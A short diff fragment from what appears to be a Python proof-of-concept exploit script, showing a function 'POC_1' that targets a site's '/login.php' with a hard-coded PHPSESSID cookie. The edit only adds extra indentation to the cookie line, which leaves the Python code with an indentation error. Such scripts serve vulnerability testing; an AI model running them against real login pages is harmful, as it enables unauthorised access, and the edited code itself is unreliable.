@@ -72,7 +72,7 @@ def title():
 
 def POC_1(target_url):
     vuln_url = target_url + "/login.php"
-    cookie = "PHPSESSID=111111111111111111111peiqi"
+        cookie = "PHPSESSID=111111111111111111111peiqi"
     headers = {
         "Content-Type": "application/x-www-form-urlencoded",
         "Cookie": cookie
